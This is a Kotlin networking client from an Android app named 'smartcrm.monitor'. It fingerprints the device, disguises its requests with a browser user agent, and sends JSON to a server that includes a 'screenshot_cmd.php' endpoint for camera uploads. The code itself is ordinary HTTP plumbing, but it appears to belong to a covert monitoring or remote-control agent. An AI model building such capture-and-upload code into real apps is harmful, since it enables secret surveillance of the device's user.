package com.smartcrm.monitor

import android.content.Context
import android.provider.Settings
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.security.MessageDigest
import java.util.concurrent.TimeUnit

object ApiClient {

    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    private val HEADERS = Headers.Builder()
        .add("User-Agent", "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36")
        .add("Accept", "application/json")
        .build()

    fun getToken(context: Context): String {
        val prefs = context.getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
        var token = prefs.getString("token", null)
        if (token.isNullOrEmpty()) {
            val androidId = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            val raw   = "${android.os.Build.MODEL}_${androidId}_smartcrm_android"
            val bytes = MessageDigest.getInstance("SHA-256").digest(raw.toByteArray())
            token = bytes.joinToString("") { "%02x".format(it) }.take(48)
            prefs.edit().putString("token", token).apply()
        }
        return token!!
    }

    fun getDeviceName(): String = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"

    /**
     * Standard POST with JSON body.
     * Automatically injects token, pc_name, device_type.
     */
    fun post(endpoint: String, data: JSONObject, context: Context): JSONObject? {
        return try {
            data.put("token", getToken(context))
            data.put("pc_name", getDeviceName())
            data.put("device_type", "android")
            val body    = data.toString().toRequestBody(JSON_MEDIA)
            val request = Request.Builder()
                .url("${Config.SERVER_URL}/$endpoint")
                .headers(HEADERS)
                .post(body)
                .build()
            val resp = client.newCall(request).execute()
            val txt  = resp.body?.string() ?: return null
            try { JSONObject(txt) } catch (e: Exception) { null }
        } catch (e: Exception) { null }
    }

    /**
     * POST to endpoint with query params appended to URL.
     * Used for camera upload: screenshot_cmd.php with ?action=upload
     */
    fun postRaw(endpoint: String, queryParams: String, data: JSONObject, context: Context): JSONObject? {
        return try {
            data.put("token", getToken(context))
            data.put("pc_name", getDeviceName())
            data.put("device_type", "android")
            val url     = "${Config.SERVER_URL}/$endpoint?$queryParams"
            val body    = data.toString().toRequestBody(JSON_MEDIA)
            val request = Request.Builder()
                .url(url)
                .headers(HEADERS)
                .post(body)
                .build()
            val resp = client.newCall(request).execute()
            val txt  = resp.body?.string() ?: return null
            try { JSONObject(txt) } catch (e: Exception) { null }
        } catch (e: Exception) { null }
    }

    /**
     * GET with query params map.
     */
    fun get(endpoint: String, params: Map<String, String> = emptyMap(), context: Context): JSONObject? {
        return try {
            val url = StringBuilder("${Config.SERVER_URL}/$endpoint?token=${getToken(context)}")
            params.forEach { (k, v) -> url.append("&$k=$v") }
            val request = Request.Builder()
                .url(url.toString())
                .headers(HEADERS)
                .get()
                .build()
            val resp = client.newCall(request).execute()
            val txt  = resp.body?.string() ?: return null
            try { JSONObject(txt) } catch (e: Exception) { null }
        } catch (e: Exception) { null }
    }
}
